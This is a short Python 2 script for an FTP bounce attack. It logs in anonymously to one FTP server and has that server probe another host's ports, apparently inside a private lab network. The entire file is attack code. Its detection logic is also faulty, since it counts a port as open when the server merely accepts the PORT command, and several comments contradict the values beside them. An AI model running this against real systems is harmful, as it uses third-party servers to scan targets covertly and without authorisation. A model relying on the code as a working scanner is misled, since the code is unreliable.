#!/usr/bin/python
"""
FTP Bounce Attack - Port Scanner
"""
from ftplib import FTP, error_temp

OPEN_PORTS = []
PORT_START = 1024    # should be 1024
PORT_END = 4600     # should be 65536
ATTACKED_IP = '192.168.1.13'
FTP_HOST = '192.168.1.12'
FTP_PORT = 21


def main():
    """
    :return: void
    """
    ftp = FTP()

    # connect to host, port 2121
    print ftp.connect(FTP_HOST, FTP_PORT)

    # user anonymous, passwd anonymous@
    print ftp.login()

    # tell the server it's in passive mode
    ftp.sendcmd('PASV')
    # search for open ports in range 1024-65535
    for port in range(PORT_START, PORT_END):
        try:
            # sends the PORT command
            response = ftp.sendport(ATTACKED_IP, port)

            # check if data connection established
            if '200' in response:
                OPEN_PORTS.append(port)
        except error_temp:
            pass

    for port in OPEN_PORTS:
        print "Discovered open port {} on {}".format(port, ATTACKED_IP)

    ftp.quit()


if __name__ == '__main__':
    main()
